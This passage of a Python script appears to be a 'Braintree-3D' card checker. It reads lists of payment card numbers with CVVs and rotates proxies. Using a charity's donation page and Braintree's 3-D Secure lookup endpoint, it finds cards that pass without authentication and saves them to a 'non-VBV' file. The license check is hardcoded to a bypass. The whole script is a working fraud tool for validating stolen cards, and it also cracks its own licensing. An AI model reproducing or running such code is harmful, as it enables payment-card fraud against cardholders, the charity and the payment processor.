                "cache-control": "no-cache",\
                "content-type": "application/json",\
                "origin": "https://donate.walkwheelcycletrust.org.uk",\
                "pragma": "no-cache",\
                "priority": "u=1, i",\
                "referer": "https://donate.walkwheelcycletrust.org.uk/",\
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",\
            }
            \
            json_data = {\
                "amount": 2,\
                "browserColorDepth": 24,\
                "browserJavaEnabled": False,\
                "browserJavascriptEnabled": True,\
                "browserLanguage": "en-US",\
                "browserScreenHeight": 800,\
                "browserScreenWidth": 1280,\
                "browserTimeZone": -420,\
                "deviceChannel": "Browser",\
                "additionalInfo": {\
                    "billingLine1": "2 Bernay Gardens",\
                    "billingLine2": "Bolbeck Park",\
                    "billingCity": "Milton Keynes",\
                    "billingPostalCode": "MK15 8QD",\
                    "billingCountryCode": "gb",\
                    "billingGivenName": firstname,\
                    "billingSurname": lastname,\
                    "email": email,\
                },\
                "bin": cc[:6],\
                "dfReferenceId": "0_"+uuid2,\
                "clientMetadata": {\
                    "requestedThreeDSecureVersion": "2",\
                    "sdkVersion": "web/3.104.0",\
                    "cardinalDeviceDataCollectionTimeElapsed": 276,\
                    "issuerDeviceDataCollectionTimeElapsed": 852,\
                    "issuerDeviceDataCollectionResult": True,\
                },\
                "authorizationFingerprint": B3tok,\
                "braintreeLibraryVersion": "braintree/web/3.104.0",\
                "_meta": {\
                    "merchantAppId": "donate.walkwheelcycletrust.org.uk",\
                    "platform": "web",\
                    "sdkVersion": "3.104.0",\
                    "source": "client",\
                    "integration": "custom",\
                    "integrationType": "custom",\
                    "sessionId": uuid1,\
                },\
            }
            \
            r = session.post(\
                f"https://api.braintreegateway.com/merchants/{merchantID}/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup",\
                headers=headers,\
                json=json_data,\
                timeout=timeout,\
                proxies=proxies,\
            )
            nonceCard = getstr(r.text, 'nonce": "', '"') or getstr(\
                r.text, 'nonce":"', '"'\
            )
            StatusVbv = getstr(r.text, 'status":"', '"') or getstr(\
                r.text, 'message":"', '"'\
            )
            \
            if StatusVbv in (\
                "authenticate_attempt_successful",\
                "authentication_unavailable",\
                "authenticate_successful",\
                "authentication_not_required",\
            ):
                print(\
                    f"{Fore.WHITE}-> {Fore.GREEN}{fullcard} {Fore.WHITE}- {Fore.GREEN}{r.status_code} {Fore.WHITE}-> {Fore.GREEN}{StatusVbv}{Style.RESET_ALL}"\
                )
                with open("card-nonvbv.txt", "a", encoding="utf-8") as f:
                    f.write(f"{fullcard} | {jenis} | {country1} | {StatusVbv}\n")
                    f.flush()
                return r, True
            else:
                print(\
                    f"{Fore.WHITE}-> {Fore.WHITE}{fullcard} {Fore.WHITE}- {Fore.RED}{r.status_code} {Fore.WHITE}-> {Fore.RED}{StatusVbv}{Style.RESET_ALL}"\
                )
                return r, False
        except KeyboardInterrupt:
            sys.exit(1)
        except Exception as e:
            err_msg = str(e).lower()
            hint = "Unknown error"
            error_type = type(e).__name__
            \
            if isinstance(e, ConnectionError):
                if "connection reset" in err_msg:
                    hint = "Connection was reset — server may have dropped or rate-limited."
                elif "connection refused" in err_msg:
                    hint = "Connection was refused — service might be down or blocked."
                elif "connection aborted" in err_msg:
                    hint = "Connection aborted — incomplete handshake or TLS drop."
                elif "name or service not known" in err_msg:
                    hint = "DNS resolution failed — domain does not exist or is misconfigured."
                elif "temporarily unavailable" in err_msg or "unreachable" in err_msg:
                    hint = "Server temporarily unavailable or unreachable."
                else:
                    hint = "General connection error (network down, proxy issue, etc.)"
                print(\
                    f" {Fore.LIGHTRED_EX}- {Fore.LIGHTCYAN_EX}{fullcard} {Fore.LIGHTWHITE_EX}- "\
                    f"{Fore.LIGHTRED_EX}{error_type}: {Fore.LIGHTMAGENTA_EX}{e} "\
                    f"{Fore.YELLOW}- {hint}{Style.RESET_ALL}"\
                )
            retry_keywords = [\
                "reset",\
                "timeout",\
                "temporarily",\
                "unreachable",\
                "aborted",\
            ]
            if any(kw in err_msg for kw in retry_keywords):
                if attempt < max_attempts:
                    delay = random.uniform(4.3, 9.5)
                    print(\
                        f" {Fore.RED}-> {Fore.LIGHTYELLOW_EX}{fullcard} {Fore.LIGHTWHITE_EX}- "\
                        f"{Fore.LIGHTRED_EX}RETRY {Fore.LIGHTWHITE_EX}- "\
                        f"{Fore.LIGHTYELLOW_EX}Waiting {Fore.RED}{delay:.2f}s{Fore.LIGHTYELLOW_EX} before retrying...{Style.RESET_ALL}"\
                    )
                    time.sleep(delay)
                    continue
                else:
                    \
                    print(\
                        f" {Fore.RED}-> {Fore.LIGHTYELLOW_EX}{fullcard} {Fore.LIGHTWHITE_EX}- "\
                        f"{Fore.LIGHTRED_EX}{r.status_code} {Fore.LIGHTWHITE_EX}- "\
                        f"{Fore.LIGHTMAGENTA_EX}FAILED, Max retries reached for {max_attempts}{Style.RESET_ALL}"\
                    )
                    return None, False
            return None, None
def worker():
    with requests.Session() as session:
        while True:
            try:
                card = card_queue.get_nowait()
            except queue.Empty:
                break                                  
            try:
                check_card(session, card)
            except Exception:
                pass                                     
            finally:
                card_queue.task_done()
                time.sleep(random.uniform(0.3, 1.0))
def load_cards(file_path: str):
    if not os.path.exists(file_path):
        print(f"[!] File '{file_path}' not found.")
        return False
    seen_bins = set()                                   
    valid_count = 0
    \
    with open(file_path, "r", encoding="utf-8") as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line or "|" not in line:
                continue
            parts = line.split("|")
            if len(parts) < 4:
                continue
            cc, mm, yy, cvv = parts[:4]
            \
\
            if not cc.isdigit() or len(cc) < 12 or len(cc) > 19:
                continue
            bin6 = cc[:6]
            if bin6 in seen_bins:
                \
                continue
            seen_bins.add(bin6)
            \
\
            if not mm.isdigit() or len(mm) != 2:
                continue
            if not (1 <= int(mm) <= 12):
                continue
            if not yy.isdigit():
                continue
            if len(yy) == 2:
                year_int = int(yy)
                yy = f"20{yy}" if year_int < 50 else f"19{yy}"
            elif len(yy) == 4:
                if not (1900 <= int(yy) <= 2100):
                    continue
            else:
                continue
            if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
                continue
            fixed_card = f"{cc}|{mm}|{yy}|{cvv}"
            card_queue.put(fixed_card)
            valid_count += 1
    print(f"[INFO] Valid (unique BIN) card: {valid_count}")
    return valid_count > 0
def load_proxy_list(proxy_input):
    proxy_list = []
    if not proxy_input:
        return proxy_list
    raw_proxies = [p.strip() for p in proxy_input.split(",") if p.strip()]
    \
    for proxy in raw_proxies:
        normalized = None
        \
        try:
            \
            if re.match(r"^(http|https|socks4|socks5)://", proxy):
                parsed = urllib.parse.urlparse(proxy)
                if parsed.hostname and parsed.port:
                    if parsed.username and parsed.password:
                        user = urllib.parse.quote(parsed.username)
                        pwd = urllib.parse.quote(parsed.password)
                        normalized = f"{parsed.scheme}://{user}:{pwd}@{parsed.hostname}:{parsed.port}"
                    else:
                        normalized = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
            elif re.match(r"^[^:@]+:[^:@]+@[^:]+:\d+$", proxy):
                userinfo, hostinfo = proxy.split("@", 1)
                user, pwd = userinfo.split(":", 1)
                host, port = hostinfo.split(":", 1)
                normalized = (\
                    f"http://{urllib.parse.quote(user)}:"\
                    f"{urllib.parse.quote(pwd)}@{host}:{port}"\
                )
            elif re.match(r"^[^:]+:\d+:[^:]+:.+$", proxy):
                host, port, user, pwd = proxy.split(":", 3)
                normalized = (\
                    f"http://{urllib.parse.quote(user)}:"\
                    f"{urllib.parse.quote(pwd)}@{host}:{port}"\
                )
            elif re.match(r"^[^:]+:[^:]+:[^:]+:\d+$", proxy):
                user, pwd, host, port = proxy.split(":", 3)
                normalized = (\
                    f"http://{urllib.parse.quote(user)}:"\
                    f"{urllib.parse.quote(pwd)}@{host}:{port}"\
                )
            elif re.match(r"^[^:]+:\d+$", proxy):
                normalized = f"http://{proxy}"
        except Exception:
            normalized = None
        if normalized:
            proxy_list.append(normalized)
        else:
            print(\
                f"{Fore.YELLOW}[WARN]{Style.RESET_ALL} Invalid proxy skipped: {proxy}"\
            )
    return proxy_list
lic = LC(label=DEFAULT_LABEL)
\
def init_license():
    os.system("cls" if os.name == "nt" else "clear")
    banner = pyfiglet.figlet_format(\
        "Verification",\
        font="slant",\
        width=100\
    )
    print(Fore.LIGHTBLUE_EX + banner + Style.RESET_ALL)
    \
    try:
        _up()
    except Exception:
        pass
    try:
        print(Fore.CYAN + "Starting license verification..." + Style.RESET_ALL)
        time.sleep(READ_DELAY)
        \
        lic.info.update({"valid": True, "name": "WLZBI", "status": "Bypassed", "expires": "Not in this lifetime"}); lic.license_key = "LICENCE-BYPASS-WLZBI-0000-0000-0000"; return
        \
        if not lic.info.get("valid"):
            raise RuntimeError("License verification failed.")
        os.system("cls" if os.name == "nt" else "clear")
        try:
            print(Fore.LIGHTBLACK_EX + banner + Style.RESET_ALL)
        except Exception:
            print("LICENSE SYSTEM\n")
        print(Fore.GREEN + "License verified. Access granted." + Style.RESET_ALL)
        time.sleep(READ_DELAY)
    except KeyboardInterrupt:
        print("\nProcess cancelled.")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"License error: {e}" + Style.RESET_ALL)
        sys.exit(1)
def main() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    banner1 = pyfiglet.figlet_format("Braintree-3D", font="slant")
    print(f"{Fore.CYAN}{banner1}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+]{Fore.YELLOW} github.com/KianSantang777/vbv{Style.RESET_ALL}")
    print('- ' * 35)
    lic.show_inline(fields=("Name", "Status", "Expire"))
    print('- ' * 35)
    \
    try:
        file_path = input(\
            f"{Fore.CYAN}[*]{Style.RESET_ALL} Card list file "\
            f"({Fore.WHITE}example: card.txt{Style.RESET_ALL}): {Fore.CYAN}"\
        ).strip()
    except KeyboardInterrupt:
        sys.exit(1)
    if not load_cards(file_path):
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} No valid cards found. Exiting.")
        return
    try:
        proxy_input = input(\
            f"{Fore.CYAN}[*]{Style.RESET_ALL} Proxy list "\
            f"({Fore.WHITE}comma separated{Style.RESET_ALL}) "\
            f"{Fore.LIGHTBLACK_EX}[optional]{Style.RESET_ALL}: {Fore.CYAN}"\
        ).strip()
    except KeyboardInterrupt:
        sys.exit(1)
    proxy_list = load_proxy_list(proxy_input)
    \
    if proxy_list:
        print(\
            f"{Fore.GREEN}[OK]{Style.RESET_ALL} "\
            f"{len(proxy_list)} proxies loaded successfully."\
        )
    else:
        print(\
            f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} "\
            f"No valid proxies provided. Running without proxy."\
        )
    os.system("cls" if os.name == "nt" else "clear")
    \
    print(f"{Fore.CYAN}{banner1}{Style.RESET_ALL}")
    print('- ' * 35)
    lic.show_inline(fields=("Name", "Status", "Expire"))
    print('- ' * 35)
    \
    threads = []
    for _ in range(min(MAX_THREADS, card_queue.qsize())):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print(\
        f"\n{Fore.GREEN}[DONE]{Style.RESET_ALL} "\
        f"All cards have been processed."\
    )
if __name__ == "__main__":
    try:
        init_license()
        main()
    except KeyboardInterrupt:
        print("\nProcess interrupted by user.")
    except SystemExit:
        pass
    except Exception as e:
        print(f"Fatal error: {e}")
    finally:
        try:
            if lic.sio:
                lic.sio.disconnect()
        except Exception:
            pass
        print("Application terminated.")
